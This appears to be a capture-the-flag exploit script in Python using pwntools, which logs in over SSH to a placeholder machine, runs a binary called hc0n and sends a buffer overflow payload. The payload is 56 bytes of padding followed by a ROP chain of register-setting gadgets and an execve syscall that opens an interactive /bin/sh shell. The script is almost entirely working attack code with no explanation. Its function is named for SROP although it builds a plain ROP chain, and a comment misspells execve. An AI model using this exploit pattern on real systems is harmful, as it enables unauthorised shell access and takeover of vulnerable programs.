from pwn import *
import sys

HOST = "MACHINE_IP"
PORT = 22

def SROP_exploit(r):
	pop_rax = 0x40061f
	pop_rdi = 0x400604
	pop_rsi = 0x40060d
	pop_rdx = 0x400616
	bin_sh = 0x4006f8
	syscall = 0x4005fa

	payload = "A"*56
	payload += p64(pop_rax).decode('ISO-8859-1')
	payload += p64(59).decode('ISO-8859-1') # 59 for cveexe
	payload += p64(pop_rdi).decode('ISO-8859-1')
	payload += p64(bin_sh).decode('ISO-8859-1')
	payload += p64(pop_rsi).decode('ISO-8859-1')
	payload += p64(0x0).decode('ISO-8859-1')
	payload += p64(pop_rdx).decode('ISO-8859-1')
	payload += p64(0x0).decode('ISO-8859-1')
	payload += p64(syscall).decode('ISO-8859-1')

	print(r.recvline())
	r.sendline(payload)
	r.interactive()

if __name__== "__main__":
	r = ssh(host=HOST, port=PORT, user="<username>", password="<password>")
	s = r.run('./hc0n')
	SROP_exploit(s)